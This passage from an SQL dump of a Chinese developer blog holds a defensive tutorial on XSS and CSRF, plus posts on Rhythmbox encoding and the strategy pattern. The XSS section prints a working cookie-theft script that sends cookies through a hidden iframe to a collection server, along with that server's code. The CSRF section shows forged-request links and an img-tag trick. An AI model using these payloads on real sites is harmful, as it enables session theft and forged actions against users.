测试），但我都没试用过，故不予评价。不管怎么说，我认为从用户输入的地方把好关总是成本最低而又最有效的做法。</p>\n<div class="section" id="id2">\n<h3>更新（2014-10-04）</h3>\n<p>这里附上一些“白名单”消毒 HTML 标签和属性（Sanitize HTML）的开源解决方案：</p>\n<ul class="simple">\n<li>Python: <a class="reference external" href="http://lxml.de/lxmlhtml.html#cleaning-up-html">lxml.html.clean</a> / <a class="reference external" href="https://github.com/jsocol/bleach">bleach</a></li>\n<li>Ruby: <a class="reference external" href="https://github.com/rgrove/sanitize/">Sanitize</a></li>\n<li>JavaScript: <a class="reference external" href="https://github.com/punkave/sanitize-html">sanitize-html</a></li>\n</ul>\n</div>\n</div>\n<div class="section" id="csrf">\n<h2>CSRF：冒充用户之手</h2>\n<p>起初我一直弄不清楚 CSRF 究竟和 XSS 有什么区别，后来才明白 CSRF 和 XSS 根本是两个不同维度上的分类。XSS 是实现 CSRF 的诸多途径中的一条，但绝对不是唯一的一条。一般习惯上把通过 XSS 来实现的 CSRF 称为 XSRF。</p>\n<p>CSRF 的全称是“跨站请求伪造”，而 XSS 的全称是“跨站脚本”。看起来有点相似，它们都是属于跨站攻击——不攻击服务器端而攻击正常访问网站的用户，但前面说了，它们的攻击类型是不同维度上的分类。CSRF 顾名思义，是伪造请求，冒充用户在站内的正常操作。我们知道，绝大多数网站是通过 cookie 等方式辨识用户身份（包括使用服务器端 Session 的网站，因为 Session ID 也是大多保存在 cookie 里面的），再予以授权的。所以要伪造用户的正常操作，最好的方法是通过 XSS 或链接欺骗等途径，让用户在本机（即拥有身份 cookie 的浏览器端）发起用户所不知道的请求。</p>\n<p>严格意义上来说，CSRF 不能分类为注入攻击，因为 CSRF 的实现途径远远不止 XSS 注入这一条。通过 XSS 来实现 CSRF 易如反掌，但对于设计不佳的网站，一条正常的链接都能造成 CSRF。</p>\n<p>例如，一论坛网站的发贴是通过 GET 请求访问，点击发贴之后 JS 把发贴内容拼接成目标 URL 并访问： <tt class="docutils literal"><span class="pre">http://example.com/bbs/create_post.php?title=标题&amp;content=内容</span></tt> 那么，我只需要在论坛中发一帖，包含一链接： <tt class="docutils literal"><span class="pre">http://example.com/bbs/create_post.php?title=我是脑残&amp;content=哈哈</span></tt> 只要有用户点击了这个链接，那么他们的帐户就会在不知情的情况下发布了这一帖子。可能这只是个恶作剧，但是既然发贴的请求可以伪造，那么删帖、转帐、改密码、发邮件全都可以伪造。</p>\n<p>如何解决这个问题，我们是否可以效仿上文应对 XSS 的做法呢？过滤用户输入， 不允许发布这种含有站内操作 URL 的链接。这么做可能会有点用，但阻挡不了 CSRF，因为攻击者可以通过 QQ 或其他网站把这个链接发布上去，为了伪装可能还使用 bit.ly 压缩一下网址，这样点击到这个链接的用户还是一样会中招。所以对待 CSRF ，我们的视角需要和对待 XSS 有所区别。CSRF 并不一定要有站内的输入，因为它并不属于注入攻击，而是请求伪造。被伪造的请求可以是任何来源，而非一定是站内。所以我们唯有一条路可行，就是过滤请求的处理者。</p>\n<p>比较头痛的是，因为请求可以从任何一方发起，而发起请求的方式多种多样，可以通过 iframe、ajax（这个不能跨域，得先 XSS）、Flash 内部发起请求（总是个大隐患）。由于几乎没有彻底杜绝 CSRF 的方式，我们一般的做法，是以各种方式提高攻击的门槛。</p>\n<p>首先可以提高的一个门槛，就是改良站内 API 的设计。对于发布帖子这一类创建资源的操作，应该只接受 POST 请求，而 GET 请求应该只浏览而不改变服务器端资源。当然，最理想的做法是使用REST 风格 <a class="footnote-reference" href="https://blog.tonyseek.com/atom.xml#id6" id="id3">[2]</a> 的 API 设计，GET、POST、PUT、DELETE 四种请求方法对应资源的读取、创建、修改、删除。现在的浏览器基本不支持在表单中使用 PUT 和 DELETE 请求方法，我们可以使用 ajax 提交请求（例如通过 jquery-form 插件，我最喜欢的做法），也可以使用隐藏域指定请求方法，然后用 POST 模拟 PUT 和 DELETE （Ruby on Rails 的做法）。这么一来，不同的资源操作区分的非常清楚，我们把问题域缩小到了非 GET 类型的请求上——攻击者已经不可能通过发布链接来伪造请求了，但他们仍可以发布表单，或者在其他站点上使用我们肉眼不可见的表单，在后台用 js 操作，伪造请求。</p>\n<p>接下来我们就可以用比较简单也比较有效的方法来防御 CSRF，这个方法就是“请求令牌”。读过《J2EE 核心模式》的同学应该对“同步令牌”应该不会陌生，“请求令牌”和“同步令牌”原理是一样的，只不过目的不同，后者是为了解决 POST 请求重复提交问题，前者是为了保证收到的请求一定来自预期的页面。实现方法非常简单，首先服务器端要以某种策略生成随机字符串，作为令牌（token），保存在 Session 里。然后在发出请求的页面，把该令牌以隐藏域一类的形式，与其他信息一并发出。在接收请求的页面，把接收到的信息中的令牌与 Session 中的令牌比较，只有一致的时候才处理请求，否则返回 HTTP 403 拒绝请求或者要求用户重新登录验证身份。</p>\n<p>请求令牌虽然使用起来简单，但并非不可破解，使用不当会增加安全隐患。使用请求令牌来防止 CSRF 有以下几点要注意：</p>\n<ul class="simple">\n<li>虽然请求令牌原理和验证码有相似之处，但不应该像验证码一样，全局使用一个 Session Key。因为请求令牌的方法在理论上是可破解的，破解方式是解析来源页面的文本，获取令牌内容。如果全局使用一个 Session Key，那么危险系数会上升。原则上来说，每个页面的请求令牌都应该放在独立的 Session Key 中。我们在设计服务器端的时候，可以稍加封装，编写一个令牌工具包，将页面的标识作为 Session 中保存令牌的键。</li>\n<li>在 ajax 技术应用较多的场合，因为很有请求是 JavaScript 发起的，使用静态的模版输出令牌值或多或少有些不方便。但无论如何，请不要提供直接获取令牌值的 API。这么做无疑是锁上了大门，却又把钥匙放在门口，让我们的请求令牌退化为同步令牌。</li>\n<li>第一点说了请求令牌理论上是可破解的，所以非常重要的场合，应该考虑使用验证码（令牌的一种升级，目前来看破解难度极大），或者要求用户再次输入密码（亚马逊、淘宝的做法）。但这两种方式用户体验都不好，所以需要产品开发者权衡。</li>\n<li>无论是普通的请求令牌还是验证码，服务器端验证过一定记得销毁。忘记销毁用过的令牌是个很低级但是杀伤力很大的错误。我们学校的选课系统就有这个问题，验证码用完并未销毁，故只要获取一次验证码图片，其中的验证码可以在多次请求中使用（只要不再次刷新验证码图片），一直用到 Session 超时。这也是为何选课系统加了验证码，外挂软件升级一次之后仍然畅通无阻。</li>\n</ul>\n<p>如下也列出一些据说能有效防范 CSRF，其实效果甚微的方式甚至无效的做法。</p>\n<ul class="simple">\n<li>通过 referer 判定来源页面：referer 是在 HTTP Request Head 里面的，也就是由请求的发送者决定的。如果我喜欢，可以给 referer 任何值。当然这个做法并不是毫无作用，起码可以防小白。但我觉得性价比不如令牌。</li>\n<li>过滤所有用户发布的链接：这个是最无效的做法，因为首先攻击者不一定要从站内发起请求（上面提到过了），而且就算从站内发起请求，途径也远远不止链接一条。比如 <tt class="docutils literal">&lt;img <span class="pre">src=&quot;./create_post.php&quot;</span> /&gt;</tt> 就是个不错的选择，还不需要用户去点击，只要用户的浏览器会自动加载图片，就会自动发起请求。</li>\n<li>在请求发起页面用 alert 弹窗提醒用户：这个方法看上去能干扰站外通过 iframe 发起的 CSRF，但攻击者也可以考虑用 <tt class="docutils literal">window.alert = <span class="pre">function(){};</span></tt> 把 alert 弄哑，或者干脆脱离 iframe，使用 Flash 来达到目的。</li>\n</ul>\n<p>总体来说，目前防御 CSRF 的诸多方法还没几个能彻底无解的。所以 CSDN 上看到讨论 CSRF 的文章，一般都会含有“无耻”二字来形容（另一位有该名号的貌似是 DDOS 攻击）。作为开发者，我们能做的就是尽量提高破解难度。当破解难度达到一定程度，网站就逼近于绝对安全的位置了（虽然不能到达）。上述请求令牌方法，就我认为是最有可扩展性的，因为其原理和 CSRF 原理是相克的。CSRF 难以防御之处就在于对服务器端来说，伪造的请求和正常的请求本质上是一致的。而请求令牌的方法，则是揪出这种请求上的唯一区别——来源页面不同。我们还可以做进一步的工作，例如让页面中 token 的 key 动态化，进一步提高攻击者的门槛。本文只是我个人认识的一个总结，便不讨论过深了。</p>\n<table class="docutils footnote" frame="void" id="id4" rules="none">\n<colgroup><col class="label" /><col /></colgroup>\n<tbody valign="top">\n<tr><td class="label"><a class="fn-backref" href="https://blog.tonyseek.com/atom.xml#id1">[1]</a></td><td><a class="reference external" href="http://zh.wikipedia.org/wiki/%E5%8F%82%E6%95%B0%E5%8C%96%E6%9F%A5%E8%AF%A2">维基百科的“参数化查询”词条</a></td></tr>\n</tbody>\n</table>\n<table class="docutils footnote" frame="void" id="id6" rules="none">\n<colgroup><col class="label" /><col /></colgroup>\n<tbody valign="top">\n<tr><td class="label"><a class="fn-backref" href="https://blog.tonyseek.com/atom.xml#id3">[2]</a></td><td><a class="reference external" href="http://zh.wikipedia.org/zh-cn/REST">维基百科的“REST</a></td></tr>\n</tbody>\n</table>\n</div>', '2014-11-06 23:43:08', 6, '2011-11-24 05:49:00', '2011-11-24 05:49:00', 0, '[["\\u8bf7\\u6c42", 0.18784450988228987], ["XSS", 0.16746980338114223], ["CSRF", 0.16102865709725214], ["\\u4ee4\\u724c", 0.16100298292742457], ["\\u7528\\u6237", 0.11027482875678879], ["HTML", 0.08373490169057111], ["\\u9875\\u9762", 0.07360215568864224], ["\\u670d\\u52a1\\u5668\\u7aef", 0.06404513698415948], ["\\u4f7f\\u7528", 0.05840043029469828], ["Session", 0.057970316555010774], ["\\u8f93\\u5165", 0.05325529941684267], ["\\u53ef\\u4ee5", 0.052878954235172415], ["\\u9a8c\\u8bc1\\u7801", 0.052417412062176726], ["\\u6211\\u4eec", 0.04933490576978987], ["\\u8f6c\\u4e49", 0.0475522617498653], ["\\u4f2a\\u9020", 0.04732049482521552], ["\\u94fe\\u63a5", 0.04685706338846982], ["\\u505a\\u6cd5", 0.046490045500269396], ["iframe", 0.0450880239872306], ["\\u6a21\\u7248", 0.044140178621875]]', NULL, NULL, '在那个年代，大家一般用拼接字符串的方式来构造动态 SQL 语句创建应用，于是 SQL 注入成了很流行的攻击方式。在这个年代， 参数化查询 [1] 已经成了普遍用法，我们已经离 SQL 注入很远了。但是，历史同样悠久的 XSS 和 CSRF 却没有远离我们。由于之前已经对 XSS 很熟悉了，所以我对用户输入的数据一直非常小心。如果输入的时候没有经过 Tidy 之类的过滤，我一定会在模板输出时候全部转义。所以个人感觉，要避免 XSS 也是很容易的，重点是要“小心”。但最近又听说了另一种跨站攻击 CSRF ，于是找了些资料了解了一下，并与 XSS 放在一起做个比较。\n\n\nXSS：脚本中的不速之客\nXSS 全称“跨站脚本”，是注入攻击的一种。其特点是不对服务器端造成任何伤害，而是通过一些正常的站内交互途径，例如发布评论，提交含有 JavaScript 的内容文本。这时服务器端如果没有过滤或转义掉这些脚本，作为内容发布到了页面上，其他用户访问这个页面的时候就会运行这些脚本。\n运行预期之外的脚本带来的后果有很多中，可能只是简单的恶作剧——一个关不掉的窗口：\nwhile (true) {\n    alert("你关不掉我~");\n}\n\n也可以是盗号或者其他未授权的操作——我们来模拟一下这个过程，先建立一个用来收集信息的服务器：\n#!/usr/bin/env python\n#-*- coding:utf-8 -*-\n\n"""\n跨站脚本注入的信息收集服务器\n"""\n\nimport bottle\n\napp = bottle.Bottle()\nplugin = bottle.ext.sqlite.Plugin(dbfile=''/var/db/myxss.sqlite'')\napp.install(plugin)\n\n@app.route(''/myxss/'')\ndef show(cookies, db):\n    SQL = ''INSERT INTO "myxss" ("cookies") VALUES (?)''\n    try:\n        db.execute(SQL, cookies)\n    except:\n        pass\n    return ""\n\nif __name__ == "__main__":\n    app.run()\n\n然后在某一个页面的评论中注入这段代码：\n// 用 <script type="text/javascript"></script> 包起来放在评论中\n\n(function(window, document) {\n    // 构造泄露信息用的 URL\n    var cookies = document.cookie;\n    var xssURIBase = "http://192.168.123.123/myxss/";\n    var xssURI = xssURIBase + window.encodeURI(cookies);\n    // 建立隐藏 iframe 用于通讯\n    var hideFrame = document.createElement("iframe");\n    hideFrame.height = 0;\n    hideFrame.width = 0;\n    hideFrame.style.display = "none";\n    hideFrame.src = xssURI;\n    // 开工\n    document.body.appendChild(hideFrame);\n})(window, document);\n\n于是每个访问到含有该评论的页面的用户都会遇到麻烦——他们不知道背后正悄悄的发起了一个请求，是他们所看不到的。而这个请求，会把包含了他们的帐号和其他隐私的信息发送到收集服务器上。\n我们知道 AJAX 技术所使用的 XMLHttpRequest 对象都被浏览器做了限制，只能访问当前域名下的 URL，所谓不能“跨域”问题。这种做法的初衷也是防范 XSS，多多少少都起了一些作用，但不是总是有用，正如上面的注入代码，用 iframe 也一样可以达到相同的目的。甚至在愿意的情况下，我还能用 iframe 发起 POST 请求。当然，现在一些浏览器能够很智能地分析出部分 XSS 并予以拦截，例如新版的 Firefox、Chrome 都能这么做。但拦截不总是能成功，何况这个世界上还有大量根本不知道什么是浏览器的用户在用着可怕的 IE6。从原则上将，我们也不应该把事关安全性的责任推脱给浏览器，所以防止 XSS 的根本之道还是过滤用户输入。用户输入总是不可信任的，这点对于 Web 开发者应该是常识。\n正如上文所说，如果我们不需要用户输入 HTML 而只想让他们输入纯文本，那么把所有用户输入进行 HTML 转义输出是个不错的做法。似乎很多 Web 开发框架、模版引擎的开发者也发现了这一点，Django 内置模版和 Jinja2 模版总是默认转义输出变量的。如果没有使用它们，我们自己也可以这么做。PHP 可以用 htmlspecialchars 函数，Python 可以导入 cgi 模块用其中的 cgi.escape 函数。如果使用了某款模版引擎，那么其必自带了方便快捷的转义方式。\n真正麻烦的是，在一些场合我们要允许用户输入 HTML，又要过滤其中的脚本。Tidy 等 HTML 清理库可以帮忙，但前提是我们小心地使用。仅仅粗暴地去掉 script 标签是没有用的，任何一个合法 HTML 标签都可以添加 onclick 一类的事件属性来执行 JavaScript。对于复杂的情况，我个人更倾向于使用简单的方法处理，简单的方法就是白名单重新整理。用户输入的 HTML 可能拥有很复杂的结构，但我们并不将这些数据直接存入数据库，而是使用 HTML 解析库遍历节点，获取其中数据（之所以不使用 XML 解析库是因为 HTML 要求有较强的容错性）。然后根据用户原有的标签属性，重新构建 HTML 元素树。构建的过程中，所有的标签、属性都只从白名单中拿取。这样可以确保万无一失——如果用户的某种复杂输入不能为解析器所识别（前面说了 HTML 不同于 XML，要求有很强的容错性），那么它不会成为漏网之鱼，因为白名单重新整理的策略会直接丢弃掉这些未能识别的部分。最后获得的新 HTML 元素树，我们可以拍胸脯保证——所有的标签、属性都来自白名单，一定不会遗漏。\n现在看来，大多数 Web 开发者都了解 XSS 并知道如何防范，往往大型的 XSS 攻击（包括前段时间新浪微博的 XSS 注入）都是由于疏漏。我个人建议在使用模版引擎的 Web 项目中，开启（或不要关闭）类似 Django Template、Jinja2 中“默认转义”（Auto Escape）的功能。在不需要转义的场合，我们可以用类似 {{ myvar | raw }} 的方式取消转义。这种白名单式的做法，有助于降低我们由于疏漏留下 XSS 漏洞的风险。\n另外一个风险集中区域，是富 AJAX 类应用（例如豆瓣网的阿尔法城）。这类应用的风险并不集中在 HTTP 的静态响应内容，所以不是开启模版自动转义能就能一劳永逸的。再加上这类应用往往需要跨域，开发者不得不自己打开危险的大门。这种情况下，站点的安全非常依赖开发者的细心和应用上线前有效的测试。现在亦有不少开源的 XSS 漏洞测试软件包（似乎有篇文章提到豆瓣网的开发也使用自动化 XSS 测试），但我都没试用过，故不予评价。不管怎么说，我认为从用户输入的地方把好关总是成本最低而又最有效的做法。\n\n更新（2014-10-04）\n这里附上一些“白名单”消毒 HTML 标签和属性（Sanitize HTML）的开源解决方案：\n\nPython: lxml.html.clean / bleach\nRuby: Sanitize\nJavaScript: sanitize-html\n\n\n\n\nCSRF：冒充用户之手\n起初我一直弄不清楚 CSRF 究竟和 XSS 有什么区别，后来才明白 CSRF 和 XSS 根本是两个不同维度上的分类。XSS 是实现 CSRF 的诸多途径中的一条，但绝对不是唯一的一条。一般习惯上把通过 XSS 来实现的 CSRF 称为 XSRF。\nCSRF 的全称是“跨站请求伪造”，而 XSS 的全称是“跨站脚本”。看起来有点相似，它们都是属于跨站攻击——不攻击服务器端而攻击正常访问网站的用户，但前面说了，它们的攻击类型是不同维度上的分类。CSRF 顾名思义，是伪造请求，冒充用户在站内的正常操作。我们知道，绝大多数网站是通过 cookie 等方式辨识用户身份（包括使用服务器端 Session 的网站，因为 Session ID 也是大多保存在 cookie 里面的），再予以授权的。所以要伪造用户的正常操作，最好的方法是通过 XSS 或链接欺骗等途径，让用户在本机（即拥有身份 cookie 的浏览器端）发起用户所不知道的请求。\n严格意义上来说，CSRF 不能分类为注入攻击，因为 CSRF 的实现途径远远不止 XSS 注入这一条。通过 XSS 来实现 CSRF 易如反掌，但对于设计不佳的网站，一条正常的链接都能造成 CSRF。\n例如，一论坛网站的发贴是通过 GET 请求访问，点击发贴之后 JS 把发贴内容拼接成目标 URL 并访问： http://example.com/bbs/create_post.php?title=标题&content=内容 那么，我只需要在论坛中发一帖，包含一链接： http://example.com/bbs/create_post.php?title=我是脑残&content=哈哈 只要有用户点击了这个链接，那么他们的帐户就会在不知情的情况下发布了这一帖子。可能这只是个恶作剧，但是既然发贴的请求可以伪造，那么删帖、转帐、改密码、发邮件全都可以伪造。\n如何解决这个问题，我们是否可以效仿上文应对 XSS 的做法呢？过滤用户输入， 不允许发布这种含有站内操作 URL 的链接。这么做可能会有点用，但阻挡不了 CSRF，因为攻击者可以通过 QQ 或其他网站把这个链接发布上去，为了伪装可能还使用 bit.ly 压缩一下网址，这样点击到这个链接的用户还是一样会中招。所以对待 CSRF ，我们的视角需要和对待 XSS 有所区别。CSRF 并不一定要有站内的输入，因为它并不属于注入攻击，而是请求伪造。被伪造的请求可以是任何来源，而非一定是站内。所以我们唯有一条路可行，就是过滤请求的处理者。\n比较头痛的是，因为请求可以从任何一方发起，而发起请求的方式多种多样，可以通过 iframe、ajax（这个不能跨域，得先 XSS）、Flash 内部发起请求（总是个大隐患）。由于几乎没有彻底杜绝 CSRF 的方式，我们一般的做法，是以各种方式提高攻击的门槛。\n首先可以提高的一个门槛，就是改良站内 API 的设计。对于发布帖子这一类创建资源的操作，应该只接受 POST 请求，而 GET 请求应该只浏览而不改变服务器端资源。当然，最理想的做法是使用REST 风格 [2] 的 API 设计，GET、POST、PUT、DELETE 四种请求方法对应资源的读取、创建、修改、删除。现在的浏览器基本不支持在表单中使用 PUT 和 DELETE 请求方法，我们可以使用 ajax 提交请求（例如通过 jquery-form 插件，我最喜欢的做法），也可以使用隐藏域指定请求方法，然后用 POST 模拟 PUT 和 DELETE （Ruby on Rails 的做法）。这么一来，不同的资源操作区分的非常清楚，我们把问题域缩小到了非 GET 类型的请求上——攻击者已经不可能通过发布链接来伪造请求了，但他们仍可以发布表单，或者在其他站点上使用我们肉眼不可见的表单，在后台用 js 操作，伪造请求。\n接下来我们就可以用比较简单也比较有效的方法来防御 CSRF，这个方法就是“请求令牌”。读过《J2EE 核心模式》的同学应该对“同步令牌”应该不会陌生，“请求令牌”和“同步令牌”原理是一样的，只不过目的不同，后者是为了解决 POST 请求重复提交问题，前者是为了保证收到的请求一定来自预期的页面。实现方法非常简单，首先服务器端要以某种策略生成随机字符串，作为令牌（token），保存在 Session 里。然后在发出请求的页面，把该令牌以隐藏域一类的形式，与其他信息一并发出。在接收请求的页面，把接收到的信息中的令牌与 Session 中的令牌比较，只有一致的时候才处理请求，否则返回 HTTP 403 拒绝请求或者要求用户重新登录验证身份。\n请求令牌虽然使用起来简单，但并非不可破解，使用不当会增加安全隐患。使用请求令牌来防止 CSRF 有以下几点要注意：\n\n虽然请求令牌原理和验证码有相似之处，但不应该像验证码一样，全局使用一个 Session Key。因为请求令牌的方法在理论上是可破解的，破解方式是解析来源页面的文本，获取令牌内容。如果全局使用一个 Session Key，那么危险系数会上升。原则上来说，每个页面的请求令牌都应该放在独立的 Session Key 中。我们在设计服务器端的时候，可以稍加封装，编写一个令牌工具包，将页面的标识作为 Session 中保存令牌的键。\n在 ajax 技术应用较多的场合，因为很有请求是 JavaScript 发起的，使用静态的模版输出令牌值或多或少有些不方便。但无论如何，请不要提供直接获取令牌值的 API。这么做无疑是锁上了大门，却又把钥匙放在门口，让我们的请求令牌退化为同步令牌。\n第一点说了请求令牌理论上是可破解的，所以非常重要的场合，应该考虑使用验证码（令牌的一种升级，目前来看破解难度极大），或者要求用户再次输入密码（亚马逊、淘宝的做法）。但这两种方式用户体验都不好，所以需要产品开发者权衡。\n无论是普通的请求令牌还是验证码，服务器端验证过一定记得销毁。忘记销毁用过的令牌是个很低级但是杀伤力很大的错误。我们学校的选课系统就有这个问题，验证码用完并未销毁，故只要获取一次验证码图片，其中的验证码可以在多次请求中使用（只要不再次刷新验证码图片），一直用到 Session 超时。这也是为何选课系统加了验证码，外挂软件升级一次之后仍然畅通无阻。\n\n如下也列出一些据说能有效防范 CSRF，其实效果甚微的方式甚至无效的做法。\n\n通过 referer 判定来源页面：referer 是在 HTTP Request Head 里面的，也就是由请求的发送者决定的。如果我喜欢，可以给 referer 任何值。当然这个做法并不是毫无作用，起码可以防小白。但我觉得性价比不如令牌。\n过滤所有用户发布的链接：这个是最无效的做法，因为首先攻击者不一定要从站内发起请求（上面提到过了），而且就算从站内发起请求，途径也远远不止链接一条。比如 <img src="./create_post.php" /> 就是个不错的选择，还不需要用户去点击，只要用户的浏览器会自动加载图片，就会自动发起请求。\n在请求发起页面用 alert 弹窗提醒用户：这个方法看上去能干扰站外通过 iframe 发起的 CSRF，但攻击者也可以考虑用 window.alert = function(){}; 把 alert 弄哑，或者干脆脱离 iframe，使用 Flash 来达到目的。\n\n总体来说，目前防御 CSRF 的诸多方法还没几个能彻底无解的。所以 CSDN 上看到讨论 CSRF 的文章，一般都会含有“无耻”二字来形容（另一位有该名号的貌似是 DDOS 攻击）。作为开发者，我们能做的就是尽量提高破解难度。当破解难度达到一定程度，网站就逼近于绝对安全的位置了（虽然不能到达）。上述请求令牌方法，就我认为是最有可扩展性的，因为其原理和 CSRF 原理是相克的。CSRF 难以防御之处就在于对服务器端来说，伪造的请求和正常的请求本质上是一致的。而请求令牌的方法，则是揪出这种请求上的唯一区别——来源页面不同。我们还可以做进一步的工作，例如让页面中 token 的 key 动态化，进一步提高攻击者的门槛。本文只是我个人认识的一个总结，便不讨论过深了。\n\n\n\n[1]维基百科的“参数化查询”词条\n\n\n\n\n\n[2]维基百科的“REST\n\n\n', NULL, NULL, NULL),
(99, 'https://blog.tonyseek.com/post/rhythmbox-coding-problem/', '音乐播放器 Rhythmbox 乱码问题', '<p>音乐播放器乱码应该是 Linux 下常见的问题，主要原因是 Windows 下的音乐 ID3 中文部分是以 GBK 家族编码的，而 Linux 下则统一为 UTF-8 编码。</p>\n<p>Google 一下，看到这篇文章 <a class="reference external" href="http://simnovo.net/fix-ubuntu-rhythmbox-code/">解决ubuntu下音乐播放器Rhythmbox乱码问题</a> 提出的两个方法应该是我们常见的。第一个方法是修改音乐的 ID3 信息，这个方法非常糟糕——因为如果把 ID3 改成 UTF-8 编码，回到 Windows 就会乱码了，这是拆东墙补西墙的做法；第二个方法思路可行，修改 Linux 环境变量，让播放器先尝试 GBK 编码，再尝试 UTF-8，但是我更喜欢另一种风格的做法。</p>\n\n<p>我们知道，在 Linux 的环境变量中， <tt class="docutils literal">/usr/local/bin/</tt> 在默认情况下拥有比 <tt class="docutils literal">/usr/bin/</tt> 更高的搜寻优先级。我们利用这一点可以给 rhythmbox 添加附加 shell 来修改环境变量，这样不用改动 .profile 影响系统全局。</p>\n<p>先 <tt class="docutils literal">sudo touch /usr/local/bin/rhythmbox</tt> 新建出我们的替代品，输入内容如下：</p>\n<figure class="code"><figcaption><span>/usr/local/bin/rhythmbox</span></figcaption><div class="highlight"><pre> <span class="c">#!/usr/bin/env sh</span>\n\n <span class="nb">export </span><span class="nv">GST_ID3_TAG_ENCODING</span><span class="o">=</span>GBK:UTF-8:GB18030\n <span class="nb">export </span><span class="nv">GST_ID3V2_TAG_ENCODING</span><span class="o">=</span>GBK:UTF-8:GB18030\n\n /usr/bin/rhythmbox <span class="nv">$@</span>\n</pre></div>\n</figure><p>然后给其添加可执行权限： <tt class="docutils literal">sudo chmod +x /usr/local/bin/rhythmbox</tt> 关掉 Rhythmbox，重新打开，删掉所有歌曲列表，重新导入，乱码问题解决。</p>', '2014-11-06 23:43:08', 6, '2011-11-22 11:29:00', '2011-11-22 11:29:00', 0, '[["bin", 0.4865312355831395], ["usr", 0.4865312355831395], ["rhythmbox", 0.34752231113081394], ["UTF", 0.34752231113081394], ["\\u4e71\\u7801", 0.29103216955581396], ["local", 0.27801784890465114], ["GBK", 0.27801784890465114], ["ID3", 0.27801784890465114], ["Linux", 0.27801784890465114], ["\\u7f16\\u7801", 0.20721500151627906], ["\\u64ad\\u653e\\u5668", 0.19911228492209304], ["\\u73af\\u5883\\u53d8\\u91cf", 0.18702250851627905], ["\\u97f3\\u4e50", 0.1541783514811628], ["GST", 0.13900892445232557], ["TAG", 0.13900892445232557], ["GB18030", 0.13900892445232557], ["export", 0.13900892445232557], ["Rhythmbox", 0.13900892445232557], ["ENCODING", 0.13900892445232557], ["sudo", 0.13900892445232557]]', NULL, NULL, '音乐播放器乱码应该是 Linux 下常见的问题，主要原因是 Windows 下的音乐 ID3 中文部分是以 GBK 家族编码的，而 Linux 下则统一为 UTF-8 编码。\nGoogle 一下，看到这篇文章 解决ubuntu下音乐播放器Rhythmbox乱码问题 提出的两个方法应该是我们常见的。第一个方法是修改音乐的 ID3 信息，这个方法非常糟糕——因为如果把 ID3 改成 UTF-8 编码，回到 Windows 就会乱码了，这是拆东墙补西墙的做法；第二个方法思路可行，修改 Linux 环境变量，让播放器先尝试 GBK 编码，再尝试 UTF-8，但是我更喜欢另一种风格的做法。\n\n我们知道，在 Linux 的环境变量中， /usr/local/bin/ 在默认情况下拥有比 /usr/bin/ 更高的搜寻优先级。我们利用这一点可以给 rhythmbox 添加附加 shell 来修改环境变量，这样不用改动 .profile 影响系统全局。\n先 sudo touch /usr/local/bin/rhythmbox 新建出我们的替代品，输入内容如下：\n/usr/local/bin/rhythmbox #!/usr/bin/env sh\n\n export GST_ID3_TAG_ENCODING=GBK:UTF-8:GB18030\n export GST_ID3V2_TAG_ENCODING=GBK:UTF-8:GB18030\n\n /usr/bin/rhythmbox $@\n\n然后给其添加可执行权限： sudo chmod +x /usr/local/bin/rhythmbox 关掉 Rhythmbox，重新打开，删掉所有歌曲列表，重新导入，乱码问题解决。', NULL, NULL, NULL);
INSERT INTO `post` (`id`, `url`, `title`, `content`, `created_at`, `blog_id`, `updated_at`, `published_at`, `hide`, `keywords`, `clicks`, `recommend`, `pure_content`, `need_analysis`, `published_at_exceed`, `updated_at_exceed`) VALUES
(100, 'https://blog.tonyseek.com/post/think-about-strategy-pattern/', '我对策略模式的理解', '<p>策略模式（Strategy Pattern）来自四人帮的《设计模式：可复用面向对象软件的基础》一书。先看维基百科的描述：</p>\n<ul class="simple">\n<li>维基中文站的词条“策略模式” <a class="footnote-reference" href="https://blog.tonyseek.com/atom.xml#id6" id="id2">[1]</a></li>\n<li>WIKIPEDIA(EN) Strategy Pattern <a class="footnote-reference" href="https://blog.tonyseek.com/atom.xml#id8" id="id3">[2]</a></li>\n</ul>\n<p>而我对它的理解，是“隔离出**有多种选择的部分**”，就如工具箱里的多用螺丝刀——一把螺丝刀可以装上十字头、一字头甚至是锥子头。</p>\n<p><img alt="多用螺丝刀图片，来自维基共享资源，采用知识共享署名-相同方式共享 3.0 Unported 许可协议授权" src="https://20.media.tumblr.com/tumblr_lt48mbqwk11qheous.jpg" /></p>\n\n<p>这种“有多种选择”的情况，可以很容易举出例子。例如网站的数据库中，保存了每个用户的 first name 和 last name，也保存了中国人的姓和名。中国人是姓在前名在后，但是按照西方习惯，first name 是名，last name 是姓。这个不是问题，因为我们的网站只面向国内。</p>\n<figure class="code"><div class="highlight"><pre><span class="k">class</span> <span class="nc">User</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>\n    <span class="sd">&quot;&quot;&quot; 网站注册用户 &quot;&quot;&quot;</span>\n\n    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">first_name</span><span class="p">,</span> <span class="n">last_name</span><span class="p">,</span> <span class="o">**</span><span class="n">profile</span><span class="p">):</span>\n        <span class="bp">self</span><span class="o">.</span><span class="n">first_name</span> <span class="o">=</span> <span class="n">first_name</span>\n        <span class="bp">self</span><span class="o">.</span><span class="n">last_name</span> <span class="o">=</span> <span class="n">last_name</span>\n        <span class="bp">self</span><span class="o">.</span><span class="n">profile</span> <span class="o">=</span> <span class="n">profile</span>\n\n    <span class="nd">@property</span>\n    <span class="k">def</span> <span class="nf">screen_name</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>\n        <span class="sd">&quot;&quot;&quot; 屏幕显示的姓名 &quot;&quot;&quot;</span>\n        <span class="c"># 姓在前, 名在后</span>\n        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">last_name</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">first_name</span>\n\n<span class="c"># 视图层调用，只需要如下</span>\n<span class="n">signed_user</span> <span class="o">=</span> <span class="n">User</span><span class="p">(</span><span class="s">&quot;某某&quot;</span><span class="p">,</span> <span class="s">&quot;张&quot;</span><span class="p">)</span>\n<span class="k">print</span><span class="p">(</span><span class="n">signed_user</span><span class="o">.</span><span class="n">screen_name</span><span class="p">)</span>\n</pre></div>\n</figure><p>很快问题来了，我们要面向国际化了 —— 如果还按照原来的方式显示，就会把非中国人的 first name 和 last name 颠倒过来显示。我们可以修改一下代码解决这个问题。</p>\n<figure class="code"><div class="highlight"><pre><span class="nd">@property</span>\n<span class="k">def</span> <span class="nf">screen_name</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>\n    <span class="sd">&quot;&quot;&quot; 屏幕显示的姓名 